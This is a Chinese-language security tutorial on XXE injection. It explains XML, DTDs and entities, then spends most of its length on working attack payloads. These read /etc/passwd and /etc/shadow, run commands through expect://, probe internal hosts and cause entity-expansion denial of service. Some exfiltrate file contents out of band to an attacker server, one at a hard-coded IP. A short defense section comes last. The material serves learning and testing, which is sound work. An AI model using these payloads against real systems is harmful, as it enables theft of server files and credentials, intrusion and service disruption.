# XXE(XML)

## xml是什么

XML 被设计用来传输和存储数据。 和 json相似，json也是用来传输和存储数据

HTML 被设计用来显示数据。

## DTD是什么

在XML中DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD文件对当前XML文档中 的节点进行了定义，这样我们加载配置文件之前，可通过指定的DTD对当前XML中的节点进行检查，确 定XML结构和数据类型是否合法。如下代码，文档类型定义部分，规定了文档元素里的数据类型，以及 可以出现哪些元素。

```
<!--XML声明-->
<?xml version="1.0"?>
<!--文档类型定义-->
<!DOCTYPE note [    <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>   <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>  <!--定义to元素为”#PCDATA”类型-->   PCDATA为字符串类型字符串
<!ELEMENT from (#PCDATA)>  <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>]  <!--定义body元素为”#PCDATA”类型-->
<!--文档元素-->
<note>
    <to>Dave</to>
    <from>Tom</from>
    <head>Reminder</head>
    <body>You are a good man</body>
</note>

```

```
PCDATA 是会被解析器解析的文本，这些文本会被解析器检查实体以及被标记	(<>，&)等符号不会被解析，要进行实体化才能被解析。
CDATA  是不会被解析的文本。
```

```
DTD的作用：

通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。
通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。
您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。
您还可以使用 DTD 来验证您自身的数据。 
```

```
实体
实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。

实体类别
实体按类型主要分为以下四种：

内置实体 (Built-in entities)
字符实体 (Character entities)
通用实体 (General entities)
参数实体 (Parameter entities)
实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。
完整的实体类别可参考 DTD - Entities

参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&实体名称。
参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。

内部实体：

<!ENTITY 实体名称 "实体的值">
1
外部实体:

<!ENTITY 实体名称 SYSTEM "URI">
1
参数实体：

<!ENTITY % 实体名称 "实体的值">或者<!ENTITY % 实体名称 SYSTEM "URI">
1
实例演示：除参数实体外实体+内部实体

<?xml version="1.0" encoding="utf-8"?><!DOCTYPE a [    <!ENTITY name "nMask">]><foo>        <value>&name;</value> </foo>
1
实例演示：参数实体+外部实体

<?xml version="1.0" encoding="utf-8"?><!DOCTYPE a [    <!ENTITY % name SYSTEM "file:///etc/passwd">    %name;]>
1
注意：%name（参数实体）是在DTD中被引用的，而&name（其余实体）是在xml文档中被引用的。

由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。

外部实体
外部实体即在DTD中使用

<!ENTITY 实体名称 SYSTEM "URI">
1

```

语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？
主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：

### 有哪些类型的外部实体

libxml2

```
file	http	ftp
```

PHP

```
file	http	ftp	php	compress.zlib 	compress.bzip2	data	glob	phar
php支持的扩展协议
https	oppenssl
ftps	

zip		 zip

ssh2.shell ssh2
ssh2.exec
ssh2.tunnel
ssh2.sftp
ssh2.scp

rar		rar

ogg		oggvorbis

expect 	expect
```

java

```
http	https	ftp	file	jar	netdoc	mailto	gopher *
```

.NET

```
file	http	https	ftp
```



## 漏洞产生在哪?

### 漏洞原理

因为xml语言本身允许引入外部实体，所以攻击者构造恶意的外部实体，引入请求包，成功的被服务器解析。从而造成了xml外部实体注入也就是XXE。

#### **漏洞的产生点：**

**传输过程中**

```xml-dtd
首先要先看头部定义
如果Content-Type 没有进行纯xml格式进行定义 ，极大可能不会有xxe漏洞

至少要有Content-Type：application/xml
	   可能application/x-www-form-urlencoded
 
1.在测试过程中 将Content-Type 添加或修改application/xml 如果返回包正常获取数据 这是XXE的前提
证明使用了xml传输数据

2.api接口传输数据三种玩法
application/json 
数据类型是 {'a':'a'}
application/x-www-form-urlencoded
数据类型是  a=dada&b=fsfs
application/xml
数据类型是<?xml>


api接口传输数据采用默认传输标准
SOAP 简单的 基于XML的一个协议 走到形式是application/xml，
即便请求包Content-Type类中没有xml，所以修改请求包application类，就可以构造恶意xxe

RESTFUL  基于HTTP的 可以使用xml格式或采用json格式传输数据
只要请求包传输数据为json格式，就可以将json格式改为xml，然后查看返回包是否正常
```

**存储过程中**

```xml-dtd
许多常见文档格式，例如doc，docx,odt本质上是zip文件，其中包含xml文件
DOCx/xlsx/pptx
ODT/ODG/ODP/ODS
SVG 矢量图
XML
PDF(experimental)
JPG(experimental)
GIF(experimental)

将这些文件 如docx文件解压 
如unzip 1.docx 
在 xml 中写入xxe代码
然后再压缩
zip -r pyload.docx

svg矢量图
Content-Type：image/svg+xml
<?xml version="1.0" encoding="UTF-8" Standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http:// www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width=" 200" xlink:href="http://vpsip/image.jpeg" /></svg>
```



#### 黑盒角度：

首先要先看头部定义
如果Content-Type 没有进行纯xml格式进行定义 ，极大可能不会有xxe漏洞

#### 白盒角度：

看恶意的xxe的库 比如xmllib2.9以内的库

### XXE危害

读文件  ：本地读文件，伪协议的读文件，OOB外带

上传文件 ：偏向java特定的库 jar协议 前提条件要出网

命令执行：特定的情况下出现命令执行 比如（xml引发的反序列化，使用了特定协议比如php的伪协议expact）

```xml-dtd
<!DOCTYPE root [!ENTITY cmd SYSTEM "expect://id">]>
<dir>
<file>&cmd;<file>
</dir>
```

内网探测

```xml-dtd
<!DOCTYPE xxe [!ELEMENT name ANY> <!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
```

dos攻击

### 挖掘思路

**1.首先要看数据是否支持xml传输**

在测试过程中 将Content-Type 添加或修改application/xml 如果返回包正常获取数据 这是XXE的前提
证明使用了xml传输数据

**2.检测xml是否会被解析**

```xml-dtd
<!xml version='1.0' encoding="utf-8"?>
<!DOCTYPE ANY[ <!ENTITY test 'this is test'>]>
<root>&test;<root>
如果&test;变成'this is test'，就进行第下一步
```

**3.检测服务器是否支持外部实体**

先看是否能带外，vps或者dnslog能接到数据 

pyload

```xml-dtd
<?xml version='1.0'?>
<!DOCTYPE ANY[
<!ENTITY % f SYSTEM "http://dnslog或者vps">%f;
]>
```

**4.如果有回显尝试**

system "file://ect/passwd" 

**5.无回显 第一部尝试**

 dtd文件 部署在vps上

```xml-dtd
<!ENTITY % ccc SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % rrr "<!ENTITY &#37; s SYSTEM 'ftp://fakeuse:%ccc;@vps:端口/b'>">
```

请求包了修改的xml数据

```xml-dtd
<?xml version='1.0' encoding="utf-8"?>
<!DOCTYPE ANY [<!ENTITY % aaa SYSTEM "http://vps:端口/dtd文件">%aaa;%rrr;%sss;]>
```



#### **pyload解析**

有回显

xml.php 内容

```php
<?php
# xml参数未进行过滤直接进行xml解析   
$xml=simplexml_load_string($_POST['xml']);
#输出解析的结果
print_r($xml);
?>
```

pyload

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root <!-- 声明根元素root-->
[  <!ENTITY file SYSTEM "file:///etc/passwd"> ] > <!--实体file 接收外部实体 "file:///etc/passwd" 结果-->
<root>&file;</root>  <!--实体引用 -->
```

访问 xml.php 可以读取 /etc/passwd 的内容。 XXE 也可以读取目录：

```xml-dtd
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ENTITY file SYSTEM "file:///">]> <root>&file;</root>
```

这个payload用于读取静态文件，而如果是PHP文件或者静态文件里包含的PHP代码是不会被读取出来 的。那怎么办呢？ 文件包含中用到过的伪协议，在这里同样可以用。不局限于伪协议，不同语言的效果 不同。

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hack [
    <!ENTITY file SYSTEM "php://filter/read=convert.base64encode/resource=D://phpstudy/PHPTutorial/WWW/aaa.txt">
]>
<hack>&file;</hack>
```

无回显

将文件内容发送到远程服务器，然后读取。 开启外部解析需要开启 LIBXML_NOENT ：

```php
$xml=simplexml_load_string($note3, 'SimpleXMLElement', LIBXML_NOENT);
```

将payload写在可控的服务器a.dtd

```xml-dtd
<!ENTITY % exp "<!ENTITY &#x25; send SYSTEM 'http://115.159.35.88/?%file;'>">
%exp;
```

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE hack [
    <!ENTITY % get  SYSTEM "http://115.159.35.88/a.dtd">
    <!ENTITY % file SYSTEM "file:///C://test/flag.txt">
    %get;
    %send;
    ]>
# 先引用了%get对象，发起请求，加载了a.dtd，而a.dtd中又引用了%exp，接在exp里声明了send，最最后send里有file。
# 在内部DTD里， 参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则parser会报错
# 也就是说 % file是参数实体引用不可以出现在exp元素声明的内部。 
```

如果无法访问外部的DTD文件怎么办?
上述的方法，是远程加载了一个DTD文件。如此做的原因在于参数实体引用只能和元素同级而不能直接出现在元素内部。

同理，那么只要引入一个文件，不管是本地还是远程文件，目的是在于绕过上述限制。于是我们可以引 用本地的dtd文件重写里面的DTD实体，即可达到和上述一样的效果

```xml-dtd
#/usr/share/yelp/dtd/docbookx.dtd 为Linux的一个文件。
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64encode/resource=file:///flag">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;send;
        '>
    %remote;
]>
<message>1234</message>
```



#### 更多pyload

XXE：基本 XML 示例

```xml-dtd
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```

XXE：实体示例

```xml-dtd
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

##### XXE：本地读文件

```xml-dtd
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

##### XXE：DOS

```xml-dtd
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
能发送3.9GB数据流量
```

##### XXE：本地文件包含示例

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

##### XXE：盲本地文件包含示例

(当第一种情况不返回任何内容时.）

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo (#ANY)>
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
```

##### XXE：访问控制绕过

(加载受限资源 - PHP 示例）

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
<foo><result>&ac;</result></foo>
```

##### XXE:SSRF

（服务器端请求伪造）示例

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```

##### XXE：（远程攻击 - 通过外部 Xml 包含）示例

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>
<lolz><lol>3..2..1...&test<lol></lolz>
```

##### XXE：UTF-7 示例

```xml-dtd
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

##### XXE：Base64 编码

```xml-dtd
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

##### XXE：SOAP 示例中的 XXE

```xml-dtd
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

##### XXE：SVG 中的 XXE

```xml-dtd
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

## xxe防御

1.过滤用户提交的xml数据

**过滤关键词:<!DOCTYPE>和<!ENTITY>,或者SYSTEM和PUBLIC**

2.使用开发语言提供的禁用外部实体的方法

**PHP:    libxml_disable_entity_loader(true)**

**JAVA:    DocumentBuilderFactory dbf = DocumentBuilderFactory.newlnstance();dbf.setExpandEntityReferences(false);**

**Python:    from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))**

3.升级LIbxml

**libxml2.9以上默认已经可以防御xml实体攻击**
